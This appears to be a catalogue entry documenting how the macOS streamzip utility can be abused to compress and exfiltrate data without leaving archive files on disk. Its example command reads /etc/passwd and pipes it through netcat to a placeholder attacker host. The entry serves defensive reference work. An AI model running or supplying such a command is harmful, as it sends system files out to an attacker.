---
trust_level: community
id: macos-collection-streamzip
namespace: macos:collection:streamzip
name: streamzip
description: File-less compression of data passed in through stdin.
author: Gabriel De Jesus (0xv1n)
version: "1.0.0"
capabilities:
  - collection.data
  - exfiltration.data
platforms:
  - macos
techniques:
  - collection
  - exfiltration
execution:
  template: "streamzip"
  sandbox: execFile
  timeout_seconds: 30
  shell: false
examples:
  - description: "Copy and compress sensitive data locally: The following command reads file data and compresses the data for exfiltration"
    command: "dd if=/etc/passwd | streamzip - stream | nc ATTACKER_IP PORT"
install:
  - method: custom
    commands:
      - "/usr/bin/streamzip"
detections:
  - type: other
    description: "No detection content at time of writing"
references:
  - label: "streamzip man page"
    url: "https://docs.oracle.com/cd/E88353_01/html/E37839/streamzip-1.html"
---

streamzip is a system utility that can be utilized to compress data from "stdin" and write the data directly to "stdout", no temporary files are created. The tool can be used by malicious actors to collect and exfiltrate sensitive data without leaving staged data archive artifacts on disk.